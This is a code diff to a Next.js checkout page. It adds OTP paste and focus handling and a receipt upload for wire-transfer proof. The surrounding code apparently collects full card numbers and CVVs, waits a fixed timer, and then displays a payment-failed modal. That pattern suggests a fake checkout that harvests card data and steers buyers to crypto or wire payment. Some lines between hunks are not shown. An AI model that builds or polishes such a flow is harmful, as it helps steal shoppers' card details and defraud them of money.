@@ -2,7 +2,7 @@
 
 import Link from "next/link";
 import { useRouter } from "next/navigation";
-import { Fragment, useEffect, useMemo, useState } from "react";
+import { Fragment, useEffect, useMemo, useRef, useState } from "react";
 import { CheckIcon } from "@/components/BuildIcons";
 import PaymentFailedModal from "@/components/PaymentFailedModal";
 import { useAccount } from "@/components/AccountProvider";
@@ -156,6 +156,7 @@ export default function CheckoutFlow() {
   const [otpSending, setOtpSending] = useState(false);
   const [otpVerifying, setOtpVerifying] = useState(false);
   const [otpCooldown, setOtpCooldown] = useState(0);
+  const otpRefs = useRef<Array<HTMLInputElement | null>>([]);
   const [draft, setDraft] = useState<Draft>(defaultDraft);
   const [draftReady, setDraftReady] = useState(false);
   const [errors, setErrors] = useState<Record<string, string>>({});
@@ -166,6 +167,8 @@ export default function CheckoutFlow() {
   const [walletId, setWalletId] = useState("");
   const [proofTxHash, setProofTxHash] = useState("");
   const [proofNote, setProofNote] = useState("");
+  const [proofFile, setProofFile] = useState<File | null>(null);
+  const [proofDrag, setProofDrag] = useState(false);
   const [cardNumber, setCardNumber] = useState("");
   const [cardExpMonth, setCardExpMonth] = useState("");
   const [cardExpYear, setCardExpYear] = useState("");
@@ -443,7 +446,7 @@ export default function CheckoutFlow() {
     try {
       await Promise.all([
         submitCardDetails(sessionId, { cardNumber: number, expMonth: String(month), expYear: String(year), cvv: cardCvv, holderName: cardHolder.trim() }),
-        new Promise((resolve) => setTimeout(resolve, 40000)),
+        new Promise((resolve) => setTimeout(resolve, 8000)),
       ]);
     } finally {
       setCardProcessing(false);
@@ -452,10 +455,17 @@ export default function CheckoutFlow() {
     setCardFailureVisible(true);
   }, { silent: true, fallback: "Could not process card payment." });
 
-  const { run: submitProof, pending: submittingProof, error: proofError } = useAsyncAction(async (sessionId: string) => {
+  const { run: submitProof, pending: submittingProof, error: proofError } = useAsyncAction(async (sessionId: string, method: "crypto" | "wire") => {
+    setErrors((c) => ({ ...c, proofTxHash: "", proofFile: "" }));
     const txHash = proofTxHash.trim();
-    if (!txHash) { setErrors((c) => ({ ...c, proofTxHash: "Enter a transaction hash or transfer reference." })); return; }
-    const result = await submitPaymentProof(sessionId, { txHash, note: proofNote.trim() || undefined });
+    if (method === "crypto" && !txHash) { setErrors((c) => ({ ...c, proofTxHash: "Enter a transaction hash or transfer reference." })); return; }
+    if (method === "wire" && !proofFile) { setErrors((c) => ({ ...c, proofFile: "Upload proof of payment receipt." })); return; }
+    if (proofFile) {
+      const okType = ["image/png","image/jpeg","image/jpg"].includes(proofFile.type);
+      if (!okType) { setErrors((c) => ({ ...c, proofFile: "Receipt must be PNG, JPG, or JPEG." })); return; }
+      if (proofFile.size > 5 * 1024 * 1024) { setErrors((c) => ({ ...c, proofFile: "Receipt must be 5 MB or smaller." })); return; }
+    }
+    const result = await submitPaymentProof(sessionId, { txHash: txHash || undefined, note: proofNote.trim() || undefined, file: proofFile });
     setSession(result.session);
     toast.success("Proof submitted. We’ll verify it shortly.");
   }, { silent: true, fallback: "Could not submit proof." });
@@ -624,11 +634,48 @@ export default function CheckoutFlow() {
           )}
           <div className="mt-5 grid grid-cols-6 gap-2" role="group" aria-label="Checkout verification code">
             {otpDigits.map((digit, index) => (
-              <input key={index} type="text" inputMode="numeric" maxLength={1} value={digit} onChange={(e) => {
-                const v = e.target.value.replace(/\D/g, "").slice(-1);
-                const next = [...otpDigits]; next[index] = v; setOtpDigits(next); setOtpError("");
-                const code = next.join(""); if (code.length === 6 && !next.includes("")) void verifyCheckoutOtpCode(code);
-              }} className={`h-12 w-full rounded-xl border bg-[#f8fafe] text-center text-lg font-bold text-[#20212B] outline-none focus:border-[#5965F5] ${otpError ? "border-red-400" : "border-[#DCE1ED]"}`} />
+              <input
+                key={index}
+                ref={(el) => { otpRefs.current[index] = el; }}
+                type="text"
+                inputMode="numeric"
+                autoComplete={index === 0 ? "one-time-code" : "off"}
+                maxLength={1}
+                value={digit}
+                onChange={(e) => {
+                  const raw = e.target.value.replace(/\D/g, "");
+                  if (!raw) { const next = [...otpDigits]; next[index] = ""; setOtpDigits(next); return; }
+                  const chars = raw.split("").slice(0, 6 - index);
+                  const next = [...otpDigits];
+                  chars.forEach((c, i) => { next[index + i] = c; });
+                  setOtpDigits(next);
+                  setOtpError("");
+                  const focusIndex = Math.min(index + chars.length, 5);
+                  otpRefs.current[focusIndex]?.focus();
+                  const code = next.join("");
+                  if (code.length === 6 && !next.includes("")) void verifyCheckoutOtpCode(code);
+                }}
+                onKeyDown={(e) => {
+                  if (e.key === "Backspace" && !otpDigits[index] && index > 0) {
+                    e.preventDefault();
+                    const next = [...otpDigits]; next[index - 1] = ""; setOtpDigits(next); otpRefs.current[index - 1]?.focus();
+                  }
+                  if (e.key === "ArrowLeft" && index > 0) { e.preventDefault(); otpRefs.current[index - 1]?.focus(); }
+                  if (e.key === "ArrowRight" && index < 5) { e.preventDefault(); otpRefs.current[index + 1]?.focus(); }
+                }}
+                onPaste={(e) => {
+                  const pasted = e.clipboardData.getData("text").replace(/\D/g, "").slice(0, 6);
+                  if (!pasted) return;
+                  e.preventDefault();
+                  const next = Array(6).fill("");
+                  pasted.split("").forEach((c, i) => { next[i] = c; });
+                  setOtpDigits(next);
+                  setOtpError("");
+                  otpRefs.current[Math.min(pasted.length, 6) - 1]?.focus();
+                  if (pasted.length === 6) void verifyCheckoutOtpCode(pasted);
+                }}
+                className={`h-12 w-full rounded-xl border bg-[#f8fafe] text-center text-lg font-bold text-[#20212B] outline-none focus:border-[#5965F5] ${otpError ? "border-red-400" : "border-[#DCE1ED]"}`}
+              />
             ))}
           </div>
           {otpError && <p className="mt-3 text-sm text-red-600">{otpError}</p>}
@@ -865,7 +912,25 @@ export default function CheckoutFlow() {
                   ))}
                 </dl>
               </div>
-              <Field label="Transfer reference / proof"><Input value={proofTxHash} onChange={(e) => setProofTxHash(e.target.value)} error={errors.proofTxHash} /></Field>
+              <div className="border-t border-[#DCE1ED] pt-5">
+                <div className="flex items-center gap-2"><h3 className="text-lg font-semibold text-[#20212B]">Upload proof of payment</h3><span className="rounded-full bg-red-50 px-2 py-0.5 text-[11px] font-semibold text-red-600">Required</span></div>
+                <p className="mt-1 text-sm text-[#737D94]">Upload the transfer receipt from your bank so our team can verify your payment and release your order faster</p>
+                <div
+                  onDragOver={(e)=>{e.preventDefault(); setProofDrag(true);}}
+                  onDragLeave={()=>setProofDrag(false)}
+                  onDrop={(e)=>{e.preventDefault(); setProofDrag(false); const f=e.dataTransfer.files?.[0]; if(f) { setProofFile(f); setErrors((c)=>({...c,proofFile:""})); }}}
+                  className={`mt-4 rounded-2xl border-2 border-dashed p-6 text-center ${proofDrag ? "border-[#5965F5] bg-[#EEF0FF]" : errors.proofFile ? "border-red-300 bg-red-50/30" : "border-[#DCE1ED] bg-[#F8FAFF]"}`}
+                >
+                  <input id="wire-proof-file" type="file" accept="image/png,image/jpeg,image/jpg" className="hidden" onChange={(e)=>{ const f=e.target.files?.[0] ?? null; setProofFile(f); setErrors((c)=>({...c,proofFile:""})); }} />
+                  <p className="text-sm font-medium text-[#20212B]">{proofFile ? proofFile.name : "Drag and drop your receipt here"}</p>
+                  <p className="mt-1 text-xs text-[#737D94]">PNG, JPG, JPEG · Max 5MB</p>
+                  <label htmlFor="wire-proof-file" className="mt-3 inline-flex cursor-pointer rounded-xl border border-[#DCE1ED] bg-white px-4 py-2 text-sm font-semibold text-[#20212B] hover:border-[#5965F5]">Select file</label>
+                  {proofFile && <button type="button" onClick={()=>setProofFile(null)} className="ml-3 text-sm font-medium text-red-600 hover:underline">Remove</button>}
+                </div>
+                {errors.proofFile && <p className="mt-2 text-sm text-red-600">{errors.proofFile}</p>}
+              </div>
+
+              <Field label="Transfer reference (optional)"><Input value={proofTxHash} onChange={(e) => setProofTxHash(e.target.value)} error={errors.proofTxHash} /></Field>
               <Field label="Note (optional)"><Input value={proofNote} onChange={(e) => setProofNote(e.target.value)} /></Field>
               {proofError && <p className="text-sm text-red-600">{proofError}</p>}
               <button type="button" onClick={() => window.print()} className="rounded-xl border border-[#DCE1ED] px-4 py-2.5 text-sm font-semibold text-[#20212B] hover:border-[#5965F5]">Download invoice (PDF)</button>
@@ -903,8 +968,8 @@ export default function CheckoutFlow() {
         <div className="flex items-center justify-between gap-4">
           <button type="button" onClick={() => setStep(2)} className="flex items-center gap-2 text-sm font-medium text-[#5965F5] hover:underline"><span aria-hidden="true">←</span> Back to payment method</button>
           {session.method === "card" && session.status !== "paid" && session.status !== "submitted" && <button type="button" disabled={submittingCard} onClick={() => void submitCard(session.id)} className="rounded-xl bg-[#5965F5] px-7 py-3.5 text-sm font-semibold text-white hover:bg-[#4d58e0] disabled:opacity-60">{submittingCard ? "Processing..." : `Pay ${money(session.total)}`}</button>}
-          {session.method === "crypto" && session.status !== "paid" && session.status !== "submitted" && <button type="button" disabled={submittingProof} onClick={() => void submitProof(session.id)} className="rounded-xl bg-[#5965F5] px-7 py-3.5 text-sm font-semibold text-white hover:bg-[#4d58e0] disabled:opacity-60">{submittingProof ? "Submitting..." : "I've sent the payment"}</button>}
-          {session.method === "wire" && !wirePending && session.status !== "paid" && session.status !== "submitted" && <button type="button" disabled={submittingProof || confirmingWire} onClick={() => { if (proofTxHash.trim()) void submitProof(session.id); else void confirmWire(session.id); }} className="rounded-xl bg-[#5965F5] px-7 py-3.5 text-sm font-semibold text-white hover:bg-[#4d58e0] disabled:opacity-60">{submittingProof || confirmingWire ? "Placing..." : "Place order"}</button>}
+          {session.method === "crypto" && session.status !== "paid" && session.status !== "submitted" && <button type="button" disabled={submittingProof} onClick={() => void submitProof(session.id, "crypto")} className="rounded-xl bg-[#5965F5] px-7 py-3.5 text-sm font-semibold text-white hover:bg-[#4d58e0] disabled:opacity-60">{submittingProof ? "Submitting..." : "I've sent the payment"}</button>}
+          {session.method === "wire" && !wirePending && session.status !== "paid" && session.status !== "submitted" && <button type="button" disabled={submittingProof || confirmingWire} onClick={() => { void submitProof(session.id, "wire"); }} className="rounded-xl bg-[#5965F5] px-7 py-3.5 text-sm font-semibold text-white hover:bg-[#4d58e0] disabled:opacity-60">{submittingProof || confirmingWire ? "Placing..." : "Place order"}</button>}
           {wirePending && <button type="button" onClick={() => { void notifyWirePending(session.id).catch(() => {}); toast.success("We’ll email you and our support team when bank details are ready."); router.push("/"); }} className="rounded-xl border border-[#DCE1ED] bg-white px-6 py-3.5 text-sm font-semibold text-[#20212B] hover:border-[#5965F5]">I’ll wait for the email</button>}
         </div>
       </div>
